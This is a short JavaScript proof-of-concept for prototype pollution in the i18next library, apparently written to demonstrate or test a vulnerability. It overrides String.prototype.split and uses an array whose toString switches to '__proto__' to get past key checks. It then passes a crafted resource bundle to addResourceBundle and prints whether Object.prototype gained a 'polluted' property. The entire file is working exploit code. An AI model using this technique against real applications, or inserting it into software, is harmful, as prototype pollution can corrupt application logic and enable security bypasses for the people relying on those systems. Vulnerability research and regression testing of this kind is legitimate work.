var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const i18next = require('i18next');
const translations = '{"constructor.prototype": {"polluted":"yes"}}';
const existingData = {};
i18next.init({
    lng: 'en',
    resources: {}
});
console.log({}.polluted);
i18next.addResourceBundle('en', 'translation', JSON.parse(translations), true, true);
console.log({}.polluted);